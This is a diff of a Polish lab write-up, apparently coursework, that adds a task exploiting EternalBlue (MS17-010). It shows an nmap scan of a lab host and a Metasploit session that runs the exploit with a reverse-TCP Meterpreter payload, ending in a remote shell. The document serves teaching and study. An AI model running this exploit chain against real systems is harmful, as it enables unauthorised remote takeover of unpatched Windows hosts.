@@ -50,7 +50,7 @@ b021d0862bc76b0995927902ec697d97b5080341a53cd90b780f50fd5886f4160bbb9d4a573b76c2
 
 31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68dbf3f3a5436ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99: 0
 
-##  1/3
+##  2/3
 
 Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie
 złam hasło metodą brute-force.
@@ -317,4 +317,429 @@ local: sekret2.txt remote: sekret2.txt
 Zawartości plików:
 ![alt text](/screenshots/5_1.png)
 
+# Zadanie 6 - Eternal Blue
+Zaczynam od wykrycia ofiary:
+```console
 
+Nmap scan report for victim02 (192.168.0.103)
+Host is up (0.00058s latency).
+Not shown: 981 closed tcp ports (reset)
+PORT      STATE SERVICE              VERSION
+21/tcp    open  ftp                  Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a5702aacb0ab784fbc1efc053623de38 (RSA)
+|_  521 4aa1db4e864943fe0eb86a337fa97882 (ECDSA)
+80/tcp    open  http                 Microsoft IIS httpd 7.5
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Microsoft-IIS/7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc                Microsoft Windows RPC
+139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
+3306/tcp  open  mysql                MySQL 5.5.20-log
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.20-log
+|   Thread ID: 6
+|   Capabilities flags: 63487
+|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, LongPassword, ODBCClient, InteractiveClient, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, FoundRows, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: nZW(]|xfwD+Jq{6;dfSM
+|_  Auth Plugin Name: mysql_native_password
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=victim02
+| Not valid before: 2022-10-13T09:06:07
+|_Not valid after:  2023-04-14T09:06:07
+| rdp-ntlm-info: 
+|   Target_Name: VICTIM02
+|   NetBIOS_Domain_Name: VICTIM02
+|   NetBIOS_Computer_Name: VICTIM02
+|   DNS_Domain_Name: victim02
+|   DNS_Computer_Name: victim02
+|   Product_Version: 6.1.7601
+|_  System_Time: 2022-11-06T13:32:46+00:00
+|_ssl-date: 2022-11-06T13:33:17+00:00; 0s from scanner time.
+4848/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
+|_ssl-date: 2022-11-06T13:33:17+00:00; 0s from scanner time.
+|_http-title: Did not follow redirect to https://victim02:4848/
+| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
+| Not valid before: 2013-05-15T05:33:38
+|_Not valid after:  2023-05-13T05:33:38
+|_http-server-header: GlassFish Server Open Source Edition  4.0 
+7676/tcp  open  java-message-service Java Message Service 301
+8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: GlassFish Server Open Source Edition  4.0 
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE TRACE
+|_http-title: GlassFish Server - Server Running
+8181/tcp  open  ssl/intermapper?
+|_ssl-date: 2022-11-06T13:33:17+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
+| Not valid before: 2013-05-15T05:33:38
+|_Not valid after:  2023-05-13T05:33:38
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 06 Nov 2022 13:30:59 GMT
+|     Content-Type: text/html
+|     Connection: close
+|     Content-Length: 4626
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+|     <html lang="en">
+|     <!--
+|     ALTER OR REMOVE COPYRIGHT NOTICES OR THIS HEADER.
+|     Copyright (c) 2010, 2013 Oracle and/or its affiliates. All rights reserved.
+|     subject to License Terms
+|     <head>
+|     <style type="text/css">
+|     body{margin-top:0}
+|     body,td,p,div,span,a,ul,ul li, ol, ol li, ol li b, dl,h1,h2,h3,h4,h5,h6,li {font-family:geneva,helvetica,arial,"lucida sans",sans-serif; font-size:10pt}
+|     {font-size:18pt}
+|     {font-size:14pt}
+|     {font-size:12pt}
+|     code,kbd,tt,pre {font-family:monaco,courier,"courier new"; font-size:10pt;}
+|     {padding-bottom: 8px}
+|     p.copy, p.copy a {font-family:geneva,helvetica,arial,"lucida sans",sans-serif; font-size:8pt}
+|     p.copy {text-align: center}
+|     table.grey1,tr.grey1,td.g
+|   HTTPOptions: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Allow: GET
+|     Date: Sun, 06 Nov 2022 13:30:59 GMT
+|     Connection: close
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 505 HTTP Version Not Supported
+|     Date: Sun, 06 Nov 2022 13:30:59 GMT
+|     Connection: close
+|_    Content-Length: 0
+8383/tcp  open  http                 Apache httpd
+|_http-title: 400 Bad Request
+|_http-server-header: Apache
+9200/tcp  open  wap-wsp?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=UTF-8
+|     Content-Length: 80
+|     handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json; charset=UTF-8
+|     Content-Length: 314
+|     "status" : 200,
+|     "name" : "Scarlet Beetle",
+|     "version" : {
+|     "number" : "1.1.1",
+|     "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
+|     "build_timestamp" : "2014-04-16T14:27:12Z",
+|     "build_snapshot" : false,
+|     "lucene_version" : "4.7"
+|     "tagline" : "You Know, for Search"
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/plain; charset=UTF-8
+|     Content-Length: 0
+|   RTSPRequest, SIPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain; charset=UTF-8
+|_    Content-Length: 0
+49152/tcp open  msrpc                Microsoft Windows RPC
+49153/tcp open  msrpc                Microsoft Windows RPC
+49154/tcp open  msrpc                Microsoft Windows RPC
+49155/tcp open  msrpc                Microsoft Windows RPC
+49176/tcp open  java-rmi             Java RMI
+```
+Za pomocą narzędzie metasploit wykorzystuję podatność wskazaną w zadaniu:
+```console
+kali㉿kali)-[~]
+└─$ msfconsole
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                           
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                           
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                           
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                           
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                           
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                           
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                           
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                           
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                           
+                                                                                                                                        
+
+       =[ metasploit v6.2.22-dev                          ]
++ -- --=[ 2256 exploits - 1187 auxiliary - 402 post       ]
++ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: To save all commands executed since start up 
+to a file, use the makerc command
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search eternal
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+```
+Kolejnym krokiem jest ustaienie odpowiedniej konfiguracji i uruchomienie narzędzia. Dostajemy się do samego serca systemu:
+```console
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metaspl
+                                             oit
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008
+                                              R2, Windows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2,
+                                              Windows 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7
+                                             , Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.147    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.0.103
+rhosts => 192.168.0.103
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 192.168.0.147:4444 
+[*] 192.168.0.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.0.103:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 1 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 1 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 2 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 2 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.0.103:445 - The target is vulnerable.
+[*] 192.168.0.103:445 - Connecting to target for exploitation.
+[+] 192.168.0.103:445 - Connection established for exploitation.
+[+] 192.168.0.103:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.0.103:445 - CORE raw buffer dump (51 bytes)
+[*] 192.168.0.103:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[*] 192.168.0.103:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[*] 192.168.0.103:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[*] 192.168.0.103:445 - 0x00000030  6b 20 31                                         k 1             
+[+] 192.168.0.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.0.103:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.0.103:445 - Sending all but last fragment of exploit packet
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 3 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 3 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 4 closed.  Reason: Died
+[-] Meterpreter session 4 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 5 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 5 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 6 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 7 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 8 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 9 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 9 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 10 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 8 is not valid and will be closed
+[-] Meterpreter session 10 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 7 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 11 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 12 closed.  Reason: Died
+[-] Meterpreter session 12 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 11 is not valid and will be closed
+[-] Meterpreter session 13 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 13 closed.
+[*] 192.168.0.103 - Meterpreter session 14 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 15 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 15 closed.
+[-] Meterpreter session 14 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 16 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 17 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 17 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 18 closed.  Reason: Died
+[-] Meterpreter session 16 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 19 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 19 closed.
+[-] Meterpreter session 18 is not valid and will be closed
+[-] Meterpreter session 20 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 20 closed.
+[*] 192.168.0.103 - Meterpreter session 21 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 21 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 22 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 23 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 23 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 24 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 25 closed.  Reason: Died
+[-] Meterpreter session 24 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 25 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 26 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 26 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 27 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 27 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 28 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 28 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 29 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 30 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 29 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 31 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 32 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 32 is not valid and will be closed
+[-] Meterpreter session 30 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 31 is not valid and will be closed
+[-] Meterpreter session 33 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 33 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 34 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 34 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 35 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 35 closed.
+[*] 192.168.0.103 - Meterpreter session 36 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 36 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 37 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 37 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 38 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 38 closed.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 39 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 39 closed.
+[*] 192.168.0.103 - Meterpreter session 40 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 41 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 40 is not valid and will be closed
+[-] Meterpreter session 41 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103:445 - Starting non-paged pool grooming
+[*] 192.168.0.103 - Meterpreter session 42 closed.  Reason: Died
+[*] 192.168.0.103 - Meterpreter session 43 closed.  Reason: Died
+[+] 192.168.0.103:445 - Sending SMBv2 buffers
+[+] 192.168.0.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.0.103:445 - Sending final SMBv2 buffers.
+[*] 192.168.0.103:445 - Sending last fragment of exploit packet!
+[*] 192.168.0.103:445 - Receiving response from exploit packet
+[+] 192.168.0.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.0.103:445 - Sending egg to corrupted connection.
+[*] 192.168.0.103:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 42 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 44 closed.  Reason: Died
+[-] Meterpreter session 44 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 43 is not valid and will be closed
+[-] Meterpreter session 46 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 46 closed.
+[*] 192.168.0.103 - Meterpreter session 47 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 48 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 48 closed.
+[*] 192.168.0.103 - Meterpreter session 49 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 49 is not valid and will be closed
+[-] Meterpreter session 47 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 50 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 50 closed.
+[*] 192.168.0.103 - Meterpreter session 50 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 51 closed.  Reason: Died
+[-] Meterpreter session 51 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] 192.168.0.103 - Meterpreter session 52 closed.  Reason: Died
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[-] Meterpreter session 52 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 53 closed.  Reason: Died
+[-] Meterpreter session 53 is not valid and will be closed
+[*] Sending stage (200774 bytes) to 192.168.0.103
+[*] Meterpreter session 45 opened (192.168.0.147:4444 -> 192.168.0.103:49801) at 2022-11-06 08:51:36 -0500
+[-] Meterpreter session 55 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 55 closed.
+[+] 192.168.0.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.0.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.0.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[-] Meterpreter session 54 is not valid and will be closed
+[*] 192.168.0.103 - Meterpreter session 54 closed.
+meterpreter > pwd
+C:\Windows\system32
+```
